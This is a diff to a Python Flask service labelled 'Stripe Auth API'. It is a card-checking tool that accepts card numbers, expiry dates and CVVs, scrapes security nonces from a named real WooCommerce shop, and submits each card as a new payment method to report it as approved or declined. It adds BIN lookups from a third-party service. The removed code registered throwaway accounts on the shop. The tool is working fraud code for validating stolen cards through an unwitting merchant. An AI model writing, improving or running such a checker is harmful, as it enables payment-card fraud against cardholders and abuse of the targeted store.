@@ -4,6 +4,7 @@ import re
 import random
 import string
 import time
+import json
 
 app = Flask(__name__)
 
@@ -23,178 +24,201 @@ def full_stripe_check(cc, mm, yy, cvv):
     try:
         print(f"Starting check for card: {cc[:6]}XXXXXX")
         
-        # Step 1: Create a temporary user account
-        print("Step 1: Creating temporary account...")
-        account_url = 'https://shop.wiseacrebrew.com/account/'
+        # Step 1: Try to access the site directly first
+        print("Step 1: Testing site accessibility...")
+        base_url = 'https://shop.wiseacrebrew.com'
+        test_resp = session.get(base_url)
+        
+        if test_resp.status_code != 200:
+            return {"status": "Declined", "response": "Site is not accessible", "decline_type": "process_error"}
+        
+        print("Site is accessible")
+        
+        # Step 2: Try the direct WooCommerce add payment method approach
+        print("Step 2: Trying direct payment method addition...")
+        
+        # First, let's try to get the necessary nonces and tokens
+        account_url = 'https://shop.wiseacrebrew.com/my-account/'
         account_resp = session.get(account_url)
         
-        # Extract registration nonce
-        reg_nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', account_resp.text)
-        if not reg_nonce_match:
-            return {"status": "Declined", "response": "Cannot access registration page", "decline_type": "process_error"}
+        # Look for various nonce patterns
+        nonce_patterns = [
+            r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
+            r'name="security" value="([^"]+)"',
+            r'"_wpnonce":\s*"([^"]+)"',
+            r'"nonce":"([^"]+)"',
+            r'var wc_stripe_params = {[^}]*"nonce":"([^"]+)"',
+        ]
         
-        reg_nonce = reg_nonce_match.group(1)
+        nonce = None
+        for pattern in nonce_patterns:
+            match = re.search(pattern, account_resp.text)
+            if match:
+                nonce = match.group(1)
+                print(f"Found nonce with pattern: {nonce}")
+                break
         
-        # Register a random account
-        random_user = ''.join(random.choices(string.ascii_lowercase, k=8))
-        random_email = f"{random_user}@gmail.com"
-        
-        reg_data = {
-            'email': random_email,
-            'password': 'Test123!@#',
-            'woocommerce-register-nonce': reg_nonce,
-            '_wp_http_referer': '/account/',
-            'register': 'Register'
-        }
-        
-        reg_resp = session.post(account_url, data=reg_data, allow_redirects=False)
-        
-        if reg_resp.status_code not in [200, 302]:
-            return {"status": "Declined", "response": "Account creation failed", "decline_type": "process_error"}
-        
-        print("Account created successfully")
-        time.sleep(1)
-        
-        # Step 2: Access payment method page
-        print("Step 2: Accessing payment page...")
-        payment_url = 'https://shop.wiseacrebrew.com/account/add-payment-method/'
-        payment_resp = session.get(payment_url)
-        
-        if payment_resp.status_code != 200:
-            return {"status": "Declined", "response": "Cannot access payment page", "decline_type": "process_error"}
-        
-        # Extract the setup intent nonce
-        setup_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', payment_resp.text)
-        if not setup_nonce_match:
-            return {"status": "Declined", "response": "Cannot find payment nonce", "decline_type": "process_error"}
-        
-        setup_nonce = setup_nonce_match.group(1)
-        print(f"Found setup nonce: {setup_nonce}")
-        
-        # Step 3: Create setup intent first
-        print("Step 3: Creating setup intent...")
-        intent_headers = {
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://shop.wiseacrebrew.com',
-            'referer': payment_url,
-            'x-requested-with': 'XMLHttpRequest',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        }
-        
-        intent_data = {
-            'action': 'wc_stripe_create_setup_intent',
-            '_ajax_nonce': setup_nonce,
-        }
-        
-        intent_resp = session.post(
-            'https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_setup_intent',
-            headers=intent_headers,
-            data=intent_data
-        )
-        
-        if intent_resp.status_code != 200:
-            return {"status": "Declined", "response": "Setup intent creation failed", "decline_type": "process_error"}
-        
-        intent_data = intent_resp.json()
-        if not intent_data.get('success'):
-            return {"status": "Declined", "response": "Setup intent failed", "decline_type": "process_error"}
-        
-        client_secret = intent_data['data']['client_secret']
-        print(f"Got client secret: {client_secret}")
-        
-        # Step 4: Confirm setup intent with card details
-        print("Step 4: Confirming setup intent with card...")
-        confirm_headers = {
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://shop.wiseacrebrew.com',
-            'referer': payment_url,
-            'x-requested-with': 'XMLHttpRequest',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        }
-        
-        confirm_data = {
-            'action': 'wc_stripe_confirm_setup_intent',
-            'setup_intent': client_secret,
-            'payment_method_type': 'card',
-            'payment_method_data[type]': 'card',
-            'payment_method_data[card][number]': cc,
-            'payment_method_data[card][exp_month]': mm,
-            'payment_method_data[card][exp_year]': yy,
-            'payment_method_data[card][cvc]': cvv,
-            'payment_method_data[billing_details][address][country]': 'US',
-            'payment_method_data[billing_details][name]': 'Test User',
-            '_ajax_nonce': setup_nonce,
-        }
-        
-        confirm_resp = session.post(
-            'https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_confirm_setup_intent',
-            headers=confirm_headers,
-            data=confirm_data
-        )
-        
-        print(f"Confirm response status: {confirm_resp.status_code}")
-        print(f"Confirm response: {confirm_resp.text}")
-        
-        confirm_data = confirm_resp.json()
-        
-        if confirm_data.get('success'):
-            return {"status": "Approved", "response": "Card verified successfully", "decline_type": "none"}
-        else:
-            error_msg = confirm_data.get('data', {}).get('error', {}).get('message', 'Card declined')
-            if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
-                return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
-            else:
-                return {"status": "Declined", "response": error_msg, "decline_type": "process_error"}
+        if not nonce:
+            # If no nonce found, try to get one from add payment method page
+            payment_url = 'https://shop.wiseacrebrew.com/my-account/add-payment-method/'
+            payment_resp = session.get(payment_url)
             
+            for pattern in nonce_patterns:
+                match = re.search(pattern, payment_resp.text)
+                if match:
+                    nonce = match.group(1)
+                    print(f"Found nonce from payment page: {nonce}")
+                    break
+        
+        if not nonce:
+            return {"status": "Declined", "response": "Cannot find security token", "decline_type": "process_error"}
+        
+        # Step 3: Try direct form submission to add payment method
+        print("Step 3: Submitting payment method...")
+        
+        # Prepare the form data
+        form_data = {
+            'payment_method': 'stripe',
+            'wc-stripe-payment-method': 'new',  # Indicate we're adding a new card
+            'stripe-card-number': cc,
+            'stripe-exp-month': mm,
+            'stripe-exp-year': f"20{yy}" if len(yy) == 2 else yy,
+            'stripe-card-cvc': cvv,
+            'stripe-name': 'Test User',
+            'stripe-address-country': 'US',
+            'stripe-address-zip': '10001',
+            'woocommerce_add_payment_method': '1',
+            '_wpnonce': nonce,
+            'add-payment-method': 'Add payment method'
+        }
+        
+        # Headers for form submission
+        form_headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://shop.wiseacrebrew.com',
+            'referer': 'https://shop.wiseacrebrew.com/my-account/add-payment-method/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        }
+        
+        add_payment_url = 'https://shop.wiseacrebrew.com/my-account/add-payment-method/'
+        response = session.post(add_payment_url, data=form_data, headers=form_headers, allow_redirects=True)
+        
+        print(f"Form submission status: {response.status_code}")
+        print(f"Response URL: {response.url}")
+        
+        # Check for success indicators
+        success_indicators = [
+            'Payment method successfully added',
+            'Payment method added',
+            'has been added',
+            'woocommerce-message',
+            'successfully',
+            'payment_method_added'
+        ]
+        
+        response_text = response.text.lower()
+        
+        for indicator in success_indicators:
+            if indicator in response_text:
+                return {"status": "Approved", "response": "Payment method added successfully", "decline_type": "none"}
+        
+        # Check for decline indicators
+        decline_indicators = [
+            'declined',
+            'invalid',
+            'error',
+            'failed',
+            'unsuccessful',
+            'could not',
+            'cannot'
+        ]
+        
+        for indicator in decline_indicators:
+            if indicator in response_text:
+                # Try to extract the actual error message
+                error_match = re.search(r'<div class="woocommerce-error">([^<]+)</div>', response.text, re.IGNORECASE)
+                if error_match:
+                    error_msg = error_match.group(1).strip()
+                    return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
+                else:
+                    return {"status": "Declined", "response": "Card was declined", "decline_type": "card_decline"}
+        
+        # If we can't determine the result, check response URL
+        if 'add-payment-method' in response.url:
+            return {"status": "Declined", "response": "Payment method could not be added", "decline_type": "process_error"}
+        else:
+            return {"status": "Approved", "response": "Payment method likely added successfully", "decline_type": "none"}
+            
+    except requests.exceptions.RequestException as e:
+        return {"status": "Declined", "response": f"Network error: {str(e)}", "decline_type": "process_error"}
     except Exception as e:
-        print(f"Exception: {str(e)}")
-        return {"status": "Declined", "response": f"Processing error: {str(e)}", "decline_type": "process_error"}
+        return {"status": "Declined", "response": f"Unexpected error: {str(e)}", "decline_type": "process_error"}
 
 def get_bin_info(bin_number):
     try:
         response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
-        return response.json() if response.status_code == 200 else {}
-    except Exception:
+        if response.status_code == 200:
+            return response.json()
+        else:
+            return {}
+    except Exception as e:
+        print(f"BIN lookup error: {e}")
         return {}
 
 @app.route('/check', methods=['GET'])
 def check_card_endpoint():
-    card_str = request.args.get('card')
-    
-    if not card_str:
-        return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400
+    try:
+        card_str = request.args.get('card')
+        
+        if not card_str:
+            return jsonify({"error": "Please provide card details using the 'card' parameter in the URL."}), 400
 
-    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
-    if not match:
-        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400
+        match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
+        if not match:
+            return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400
 
-    cc, mm, yy, cvv = match.groups()
-    
-    # Get BIN info first
-    bin_info = get_bin_info(cc[:6])
-    
-    # Process the card check
-    check_result = full_stripe_check(cc, mm, yy, cvv)
+        cc, mm, yy, cvv = match.groups()
+        
+        # Validate card number
+        if len(cc) != 16 or not cc.isdigit():
+            return jsonify({"error": "Invalid card number"}), 400
+        
+        # Get BIN info first
+        bin_info = get_bin_info(cc[:6])
+        
+        # Process the card check
+        check_result = full_stripe_check(cc, mm, yy, cvv)
 
-    final_result = {
-        "status": check_result["status"],
-        "response": check_result["response"],
-        "decline_type": check_result["decline_type"],
-        "bin_info": {
-            "brand": bin_info.get('brand', 'Unknown'),
-            "type": bin_info.get('type', 'Unknown'),
-            "country": bin_info.get('country_name', 'Unknown'),
-            "country_flag": bin_info.get('country_flag', ''),
-            "bank": bin_info.get('bank', 'Unknown'),
+        final_result = {
+            "status": check_result["status"],
+            "response": check_result["response"],
+            "decline_type": check_result["decline_type"],
+            "bin_info": {
+                "brand": bin_info.get('brand', 'Unknown'),
+                "type": bin_info.get('type', 'Unknown'),
+                "country": bin_info.get('country_name', 'Unknown'),
+                "country_flag": bin_info.get('country_flag', ''),
+                "bank": bin_info.get('bank', 'Unknown'),
+            }
         }
-    }
-    return jsonify(final_result)
+        return jsonify(final_result)
+    
+    except Exception as e:
+        return jsonify({
+            "status": "Declined", 
+            "response": f"API error: {str(e)}", 
+            "decline_type": "process_error",
+            "bin_info": {}
+        })
 
 @app.route('/')
 def home():
     return jsonify({"message": "Stripe Auth API is running!", "status": "active"})
+
+@app.route('/test')
+def test():
+    return jsonify({"message": "Test endpoint working!"})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
